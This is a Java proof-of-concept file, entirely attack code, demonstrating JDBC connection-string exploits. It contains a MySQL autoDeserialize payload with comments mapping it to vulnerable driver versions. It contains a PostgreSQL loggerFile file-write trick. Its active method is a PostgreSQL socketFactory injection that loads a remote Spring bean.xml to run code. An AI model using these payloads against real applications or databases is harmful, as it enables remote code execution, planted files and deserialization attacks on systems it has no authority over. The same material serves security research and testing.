import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Main {
    public static void main(String[] args) {
        postGreSqlCmd();
//        postGreSqlWriteFile();
//        mysqlDeserialize();
    }
    public static void mysqlDeserialize() {
//        String driver = "com.mysql.cj.jdbc.Driver";
         String driver = "com.mysql.jdbc.Driver";//
//        String DB_URL = "jdbc:mysql://127.0.0.1:3306/mysql?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";//8.x-8.0.19
        // String DB_URL = "jdbc:mysql://127.0.0.1:3306/mysql?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";//6.x(属性名不同)
         String DB_URL = "jdbc:mysql://127.0.0.1:3306/mysql?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";//5.1.11及以上的5.x版本（包名没有了cj）5.1.10及以下的5.1.X版本需要连接后执行查询。
//         String DB_URL = "jdbc:mysql://127.0.0.1:3306/mysql?detectCustomCollations=true&autoDeserialize=true";//5.1.29-5.1.40
        // String DB_URL = "jdbc:mysql://127.0.0.1:3306/mysql?autoDeserialize=true"//5.1.28-5.1.19
        try {
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL);
          }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void postGreSqlWriteFile(){
        String loggerLevel = "debug";
        String loggerFile = "test.txt";
        String shellContent="test";
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test?loggerLevel="+loggerLevel+"&loggerFile="+loggerFile+ "&"+shellContent;
        try{
            Connection connection = DriverManager.getConnection(jdbcUrl);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void postGreSqlCmd() {
        String socketFactoryClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = "http://127.0.0.1:8000/bean.xml";
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test/?socketFactory="+socketFactoryClass+ "&socketFactoryArg="+socketFactoryArg;
        try {
            Connection connection = DriverManager.getConnection(jdbcUrl,"a","b");
        }catch (Exception e){
//            e.printStackTrace();
        }
    }
}